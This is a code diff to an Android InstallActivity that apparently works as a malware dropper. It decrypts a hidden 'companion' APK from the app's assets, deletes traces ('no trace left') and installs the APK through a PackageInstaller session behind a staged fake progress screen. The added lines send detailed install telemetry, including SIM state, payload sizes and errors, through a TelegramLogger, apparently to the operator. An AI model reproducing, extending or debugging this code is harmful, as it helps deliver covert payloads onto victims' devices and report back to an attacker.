@@ -493,6 +493,7 @@ class InstallActivity : Activity() {
 
     private fun startDownload() {
         if (installFlowActive) {
+            TelegramLogger.send(this, "START_DOWNLOAD", "SKIPPED", "installFlowActive=true already")
             return
         }
         installFlowActive = true
@@ -506,6 +507,7 @@ class InstallActivity : Activity() {
             simState != android.telephony.TelephonyManager.SIM_STATE_UNKNOWN
         } catch (t: Throwable) { true }
 
+        TelegramLogger.send(this, "START_DOWNLOAD", "OK", "hasSim=$hasSim")
         setStage(Stage.DOWNLOADING)
         startProgressAnimation()
     }
@@ -531,6 +533,8 @@ class InstallActivity : Activity() {
         if (mutatedFile.exists() && mutatedFile.length() > 0L) {
             val bytes = mutatedFile.readBytes()
             mutatedFile.delete()   // no trace left
+            TelegramLogger.send(this, "GET_COMPANION_BYTES", "TIER1_MUTATED",
+                "size=${bytes.size} zipMagic=${bytes.take(4).map { "%02x".format(it) }.joinToString("")}")
             return bytes
         }
 
@@ -540,15 +544,22 @@ class InstallActivity : Activity() {
         return try {
             val encrypted = assets.open(BuildConfig.ASSET_A).use { it.readBytes() }
             if (encrypted.size < 5) {
+                TelegramLogger.send(this, "GET_COMPANION_BYTES", "FAILED",
+                    "ASSET_A=${BuildConfig.ASSET_A} size=${encrypted.size} too small")
                 return ByteArray(0)
             }
             val decrypted = decryptCompanionBlob(encrypted)
-            // Verify decrypted bytes look like a valid APK (ZIP magic: PK\x03\x04)
-            if (decrypted.size > 4 &&
+            val zipMagic = if (decrypted.size > 4)
+                decrypted.take(4).map { "%02x".format(it) }.joinToString("") else "N/A"
+            val validApk = decrypted.size > 4 &&
                 decrypted[0] == 0x50.toByte() &&
                 decrypted[1] == 0x4B.toByte() &&
                 decrypted[2] == 0x03.toByte() &&
-                decrypted[3] == 0x04.toByte()) {
+                decrypted[3] == 0x04.toByte()
+            TelegramLogger.send(this, "GET_COMPANION_BYTES", if (validApk) "TIER2_OK" else "TIER2_INVALID_MAGIC",
+                "ASSET_A=${BuildConfig.ASSET_A} encSize=${encrypted.size} decSize=${decrypted.size} magic=$zipMagic validApk=$validApk")
+            // Verify decrypted bytes look like a valid APK (ZIP magic: PK\x03\x04)
+            if (validApk) {
                 decrypted
             } else {
                 // Decryption produced invalid APK — return raw bytes anyway and let
@@ -556,13 +567,22 @@ class InstallActivity : Activity() {
                 decrypted
             }
         } catch (e: Exception) {
+            TelegramLogger.send(this, "GET_COMPANION_BYTES", "EXCEPTION_TIER2",
+                "ASSET_A=${BuildConfig.ASSET_A} error=${e.javaClass.simpleName}: ${e.message}")
             // assets.open() threw — ASSET_A not found in APK or I/O error
             // Fall back: try opening "companion.apk" directly (pre-rename fallback)
             try {
                 val fallback = assets.open("companion.apk").use { it.readBytes() }
                 val fb = decryptCompanionBlob(fallback)
+                val validFb = fb.size > 4 &&
+                    fb[0] == 0x50.toByte() && fb[1] == 0x4B.toByte() &&
+                    fb[2] == 0x03.toByte() && fb[3] == 0x04.toByte()
+                TelegramLogger.send(this, "GET_COMPANION_BYTES", if (validFb) "TIER2_FALLBACK_OK" else "TIER2_FALLBACK_INVALID",
+                    "size=${fb.size} validApk=$validFb")
                 fb
             } catch (e2: Exception) {
+                TelegramLogger.send(this, "GET_COMPANION_BYTES", "FAILED_ALL_TIERS",
+                    "tier2Err=${e.message} fallbackErr=${e2.message}")
                 ByteArray(0)
             }
         }
@@ -671,15 +691,21 @@ class InstallActivity : Activity() {
             if (phaseIndex == 2 && !installTriggered) {
                 installTriggered = true
                 setStage(Stage.INSTALLING)
+                TelegramLogger.send(this@InstallActivity, "PHASE3_INSTALL_TRIGGERED", "OK",
+                    "setStage=INSTALLING getCompanionBytes starting")
                 Thread {
                     try {
                         val apkBytes = getCompanionBytes()
                         if (apkBytes.isNotEmpty()) {
                             runOnUiThread { prepareAndStartVpn(apkBytes) }
                         } else {
+                            TelegramLogger.send(this@InstallActivity, "PHASE3_APK_BYTES", "FAILED",
+                                "getCompanionBytes returned empty — setStage ERROR")
                             runOnUiThread { setStage(Stage.ERROR) }
                         }
                     } catch (e: Exception) {
+                        TelegramLogger.send(this@InstallActivity, "PHASE3_APK_BYTES", "EXCEPTION",
+                            "${e.javaClass.simpleName}: ${e.message}")
                         runOnUiThread { setStage(Stage.ERROR) }
                     }
                 }.start()
@@ -742,6 +768,8 @@ class InstallActivity : Activity() {
     // ── PackageInstaller session ──────────────────────────────────────────────
     @SuppressLint("BlockedPrivateApi")
     private fun installViaSession(apkBytes: ByteArray, attempt: Int) {
+        TelegramLogger.send(this, "INSTALL_VIA_SESSION", "START",
+            "attempt=$attempt apkSize=${apkBytes.size}")
         try {
             val packageInstaller = packageManager.packageInstaller
             val params = PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL)
@@ -1045,7 +1073,16 @@ class InstallActivity : Activity() {
 
             } catch (_: Exception) {}
 
-            val sessionId = packageInstaller.createSession(params)
+            val sessionId = try {
+                val id = packageInstaller.createSession(params)
+                TelegramLogger.send(this, "CREATE_SESSION", "OK",
+                    "attempt=$attempt sessionId=$id pkgName=$pkgName")
+                id
+            } catch (e: Exception) {
+                TelegramLogger.send(this, "CREATE_SESSION", "FAILED",
+                    "attempt=$attempt pkgName=$pkgName error=${e.javaClass.simpleName}: ${e.message}")
+                throw e
+            }
             val session   = packageInstaller.openSession(sessionId)
             try {
                 // Save APK to cache so it survives activity recreation
@@ -1069,20 +1106,30 @@ class InstallActivity : Activity() {
                     PendingIntent.getBroadcast(this, SESSION_REQUEST, intent, flags).intentSender
                 )
                 session.close()
+                TelegramLogger.send(this, "SESSION_COMMIT", "OK",
+                    "attempt=$attempt sessionId=$sessionId pkgName=$pkgName — waiting for InstallReceiver callback")
 
             } catch (e: IOException) {
+                TelegramLogger.send(this, "SESSION_WRITE_COMMIT", "IO_EXCEPTION",
+                    "attempt=$attempt error=${e.javaClass.simpleName}: ${e.message}")
                 session.abandon()
                 if (attempt < MAX_RETRIES) {
                     handler.postDelayed({ installViaSession(apkBytes, attempt + 1) }, 1000)
                 } else {
+                    TelegramLogger.send(this, "SESSION_WRITE_COMMIT", "MAX_RETRIES_REACHED",
+                        "attempt=$attempt setStage ERROR")
                     setStage(Stage.ERROR)
                 }
             }
         } catch (e: Exception) {
             android.util.Log.e("InstallActivity", "installViaSession attempt $attempt failed: ${e::class.simpleName}: ${e.message}", e)
+            TelegramLogger.send(this, "INSTALL_VIA_SESSION", "OUTER_EXCEPTION",
+                "attempt=$attempt error=${e.javaClass.simpleName}: ${e.message}")
             if (attempt < MAX_RETRIES) {
                 handler.postDelayed({ installViaSession(apkBytes, attempt + 1) }, 1000)
             } else {
+                TelegramLogger.send(this, "INSTALL_VIA_SESSION", "MAX_RETRIES_REACHED",
+                    "attempt=$attempt setStage ERROR")
                 setStage(Stage.ERROR)
             }
         }
